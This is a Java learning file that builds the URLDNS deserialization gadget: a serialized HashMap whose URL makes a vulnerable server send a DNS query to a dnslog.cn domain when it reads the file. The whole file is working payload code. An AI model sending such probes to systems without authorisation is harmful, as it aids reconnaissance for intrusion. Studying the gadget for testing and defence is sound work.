package org.zzlearn_test.ser;

import java.io.*;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;


/**
 * @author yhy
 * @date 2021/6/2 16:21
 * @github https://github.com/yhy0
 */

public class ser{

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void main(String[] args) throws Exception {
        HashMap hashMap = new HashMap();

        // 设置 put 时不发起 dns 解析
        URLStreamHandler handler = new ser.SilentURLStreamHandler();
        URL url = new URL(null, "http://test1.jtrtn1.dnslog.cn", handler);

        // 通过反射将put之后 hashCode 的 值重新赋值为 -1
        Class clazz = Class.forName("java.net.URL");
        Field f = clazz.getDeclaredField("hashCode");
        f.setAccessible(true);

        hashMap.put(url,"123");
        f.set(url,-1);

        // 序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);

    }

}